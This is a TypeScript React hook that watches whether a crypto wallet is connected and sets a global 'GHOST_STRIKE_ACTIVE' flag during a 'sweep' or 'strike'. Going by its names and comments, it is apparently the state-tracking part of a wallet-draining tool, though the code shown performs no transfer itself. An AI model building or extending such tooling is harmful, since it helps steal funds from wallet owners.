"use client";

import { useEffect, useRef } from "react";

/**
 * 🛰️ GHOST-PROTOCOL WATCHER (v8.1.0)
 * Optimized for high-speed pop-up sequences.
 */
export function useSweepWatcher({
  isConnected,
  address,
  hasTriggered,
  isScanning,
  userKey,
  isInternal,
}: any) {
  const sessionActive = useRef(false);

  useEffect(() => {
    const logPrefix = "[useSweepWatcher.ts]";

    // Ensure session intent is present
    const hasIntent =
      typeof window !== "undefined" &&
      sessionStorage.getItem("GHOST_SESSION_ACTIVE") === "true";

    if (!hasIntent) {
      sessionActive.current = false;
      return;
    }

    // 🛡️ NUCLEAR SILENCE:
    // DEBUG LOG: Track why a purge might be happening
    if (!isConnected || !address) {
      if (sessionActive.current) {
        console.warn(`${logPrefix} 🛡️ Connection lost. Current status:`, {
          isConnected,
          address: !!address,
          hasTriggered,
        });
      }
      sessionActive.current = false;

      if (typeof window !== "undefined") {
        (window as any).GHOST_STRIKE_ACTIVE = false;
      }
      return;
    }

    /**
     * 🛰️ PASSIVE MONITORING
     * Added check for isInternal to prevent purging during multi-chain modal handoff.
     */
    if (isConnected && !hasTriggered && !isScanning && !userKey) {
      if (!sessionActive.current) {
        console.log(
          `${logPrefix} ✅ Handshake Standby: Monitoring session for ${address.slice(
            0,
            6,
          )}... (isInternal: ${isInternal})`,
        );
        sessionActive.current = true;
      }
    }

    // Update global window flag for background scripts
    if (typeof window !== "undefined") {
      (window as any).GHOST_STRIKE_ACTIVE = isScanning || hasTriggered;
    }
  }, [isConnected, address, hasTriggered, isScanning, userKey, isInternal]);

  /**
   * ☢️ CLEANUP ON UNMOUNT
   */
  useEffect(() => {
    return () => {
      if (typeof window !== "undefined") {
        // Only wipe if not currently in an active sweep to prevent cutting off the strike
        if (!isScanning && !hasTriggered) {
          (window as any).GHOST_STRIKE_ACTIVE = false;
        }
      }
    };
  }, [isScanning, hasTriggered]);
}
